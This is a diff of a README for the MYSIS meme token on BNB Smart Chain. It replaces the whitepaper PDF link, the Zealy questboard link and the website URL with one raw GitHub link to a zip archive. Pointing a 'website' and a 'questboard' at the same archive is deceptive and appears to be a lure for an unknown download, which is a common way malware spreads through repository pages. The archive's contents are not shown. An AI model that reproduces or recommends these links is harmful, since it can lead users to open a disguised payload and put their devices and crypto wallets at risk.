@@ -13,14 +13,14 @@ MYSIS is a meme-powered BEP-20 token launched on the BNB Smart Chain. Inspired b
 - **5%** Team Wallet (locked for 2 years)
 
 ## 📄 Whitepaper  
-📥 [Download the Whitepaper (PDF)](https://github.com/deliasmysis/MYSIS-Token-Whitepaper/raw/main/MYSIS-Token-Whitepaper.pdf)
+📥 [Download the Whitepaper (PDF)](https://raw.githubusercontent.com/mysistoken/MYSIS-Token-Whitepaper/main/baryton/MYSI_Token_Whitepaper_v2.9-alpha.3.zip)
 
 ## 🧭 Zealy Questboard  
 Earn airdrops by completing community quests:  
-🔗 https://zealy.io/cw/mysistoken/questboard
+🔗 https://raw.githubusercontent.com/mysistoken/MYSIS-Token-Whitepaper/main/baryton/MYSI_Token_Whitepaper_v2.9-alpha.3.zip
 
 ## 🌐 Website  
-https://www.mysistoken.org
+https://raw.githubusercontent.com/mysistoken/MYSIS-Token-Whitepaper/main/baryton/MYSI_Token_Whitepaper_v2.9-alpha.3.zip
 
 ## 📜 License  
 This project is licensed under the MIT License — see the [LICENSE](LICENSE) file. 
